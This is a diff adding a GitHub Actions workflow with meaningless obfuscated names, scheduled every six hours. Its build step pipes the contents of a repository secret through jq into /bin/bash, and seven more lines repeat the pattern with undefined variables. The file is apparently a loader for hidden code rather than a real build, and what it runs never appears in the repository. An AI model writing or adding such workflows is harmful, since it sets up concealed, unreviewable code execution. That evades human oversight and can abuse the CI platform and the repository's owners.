@@ -1,0 +1,25 @@
+name: weimenghema
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weimenghema
+        env:
+          nbtrp57: ${{ secrets.nbtrp57 }}
+        run: |
+          echo $nbtrp57 | jq -r .ood27998 | /bin/bash
+          echo $cnjfx4779 | jq -r .ugf5 | /bin/bash
+          echo $pmi44 | jq -r .cu732 | /bin/bash
+          echo $h6271 | jq -r .ybqan92558 | /bin/bash
+          echo $q4 | jq -r .jgjm8440 | /bin/bash
+          echo $rltyu47903 | jq -r .ik59 | /bin/bash
+          echo $ponxe70 | jq -r .isnt20 | /bin/bash
+          echo $qb9629 | jq -r .mn92774 | /bin/bash
+
